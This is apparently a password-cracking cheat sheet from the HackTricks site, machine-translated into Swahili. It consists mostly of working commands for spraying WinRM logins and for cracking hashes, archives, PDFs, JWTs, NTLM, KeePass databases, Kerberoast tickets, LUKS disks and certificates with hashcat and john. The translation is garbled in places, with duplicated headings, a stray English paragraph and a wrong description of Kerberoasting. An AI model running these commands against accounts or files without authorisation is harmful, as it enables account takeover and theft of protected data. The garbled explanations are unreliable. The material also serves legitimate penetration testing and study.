Winrm ni itifaki inayotumiwa kwa kuingia kwa mbali kwenye mifumo ya Windows. Kwa kawaida, inatumia bandari ya 5985 kwa HTTP na bandari ya 5986 kwa HTTPS. Kwa kufanya jaribio la kubadilisha nywila kwa kutumia Brute Force, unaweza kutumia zana kama Hydra au Medusa. Kumbuka kwamba kufanya mashambulizi ya Brute Force kunaweza kusababisha kufungiwa au kuchukuliwa hatua za usalama.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zaidi yaliyotengenezwa na zana za jamii **za juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Mtaani

### Mitambo ya kuvunja mtandaoni

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 na/au bila ESS/SSP na na thamani yoyote ya changamoto)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, na nyaraka za MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes na file hashes)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Angalia hii kabla ya kujaribu kuvunja nguvu Hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Shambulizi la zip ya maandishi yaliyofahamika

Unahitaji kujua **maandishi ya wazi** (au sehemu ya maandishi ya wazi) **ya faili iliyomo ndani** ya zip iliyofichwa. Unaweza kuangalia **majina ya faili na ukubwa wa faili zilizomo** ndani ya zip iliyofichwa kwa kufanya: **`7z l encrypted.zip`**\
Pakua [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) kutoka ukurasa wa matoleo.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

### 7z
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Brute-force attacks are commonly used to crack passwords by trying all possible combinations until the correct one is found. This method can be very time-consuming but is often successful if the password is weak. Tools like John the Ripper and Hashcat are popular for conducting brute-force attacks. It is important to note that brute-force attacks can be detected and prevented by implementing measures such as account lockouts after a certain number of failed attempts, using complex and unique passwords, and enabling multi-factor authentication.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Nenosiri la Mmiliki wa PDF

Ili kuvunja nenosiri la mmiliki wa PDF angalia hapa: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Kuvunja NTLM
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

### Keepass

Keepass ni chombo cha usimamizi wa nywila kinachotumika kuhifadhi na kusimamia nywila. Inatumia encryption ili kuhakikisha usalama wa nywila zilizohifadhiwa. Matumizi ya Keepass yanaweza kuhusisha mbinu ya kujaribu kila iwezekanavyo (brute force) kwa kujaribu nywila tofauti hadi itakapopatikana ile sahihi. Hii inaweza kufanyika kwa kutumia programu maalum za kubofya nywila (password cracking tools) au kwa njia zingine za kujaribu kuingia kwa nguvu.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting ni mbinu ya kuvunja nywila ambapo mshambuliaji anajaribu kuvunja nywila za akaunti za huduma za Active Directory kwa kutumia mbinu ya Brute Force. Mshambuliaji huchambua nywila za akaunti za huduma za Active Directory zilizohifadhiwa kwa kutumia mbinu ya Kerberos pre-authentication. Mbinu hii inaruhusu mshambuliaji kuvunja nywila za akaunti za huduma za Active Directory bila kujulikana.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Picha ya Lucks

#### Mbinu 1

Sakinisha: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Mbinu 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Mwongozo mwingine wa Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Funguo ya Siri ya PGP/GPG
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Tumia [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kisha john

### Open Office Pwd Protected Column

Ikiwa una faili ya xlsx na safu iliyolindwa kwa nenosiri unaweza kuiondoa ulinzi:

* **Iipakie kwenye google drive** na nenosiri litafutwa moja kwa moja
* Kui **ondoa** kwa **mikono**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Vyeti vya PFX
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia** mifumo ya kiotomatiki inayotumia zana za **jamii** za **juu kabisa** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Zana

**Mifano ya Hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Kutambua Hash
```bash
hash-identifier
> <HASH>
```
### Orodha za Maneno

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Vyombo vya Kuzalisha Orodha za Maneno**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Jenereta ya kipekee ya kutembea kwa kibodi yenye herufi za msingi zinazoweza kubadilishwa, ramani ya funguo na njia.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Kubadilisha John

Soma _**/etc/john/john.conf**_ na uipange
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Mashambulizi ya Hashcat

* **Mashambulizi ya Orodha ya Maneno** (`-a 0`) na sheria

**Hashcat** tayari inakuja na **folda inayohifadhi sheria** lakini unaweza kupata [**sheria nyingine za kuvutia hapa**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Mbinu ya kushambulia kwa kutumia orodha za maneno** 

Inawezekana **kuunganisha orodha 2 za maneno kuwa moja** na hashcat.\
Ikiwa orodha ya kwanza ilikuwa na neno **"hello"** na ya pili ilikuwa na mistari 2 yenye maneno **"world"** na **"earth"**. Maneno `helloworld` na `helloearth` yataundwa.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Shambulizi la Barakoa** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) shambulizi
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Njia za Hashcat
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
### Kuvunja Hashes za Linux - faili ya /etc/shadow
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Kuvunja Windows Hashes

Kuvunja Windows Hashes kunaweza kufanywa kwa kutumia mbinu ya nguvu ya kufikiria. Hii inahusisha jaribio la kila aina ya nenosiri linalowezekana hadi hash inayolinganishwa inapatikana. Kuna zana nyingi zinazopatikana kama hashcat na John the Ripper ambazo zinaweza kutumika kwa madhumuni haya. Kumbuka kuwa kuvunja hashes za Windows bila idhini ni kinyume cha sheria na inapaswa kufanywa tu kwa ruhusa ya mmiliki wa mfumo.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
### Kuvunja Hashes za Maombi Maarufu

Kuvunja nywila za maombi maarufu kunaweza kufanywa kwa kutumia mbinu ya nguvu ya kufikiria. Hii inahusisha kujaribu maneno au tarakimu nyingi kwa haraka hadi kupata mechi na hash iliyohifadhiwa. Kwa kufanya hivyo, unaweza kuvunja nywila za maombi kama vile WordPress, Joomla, na zinginezo.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kudhibiti mchakato** kwa urahisi kutumia zana za **jamii za hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
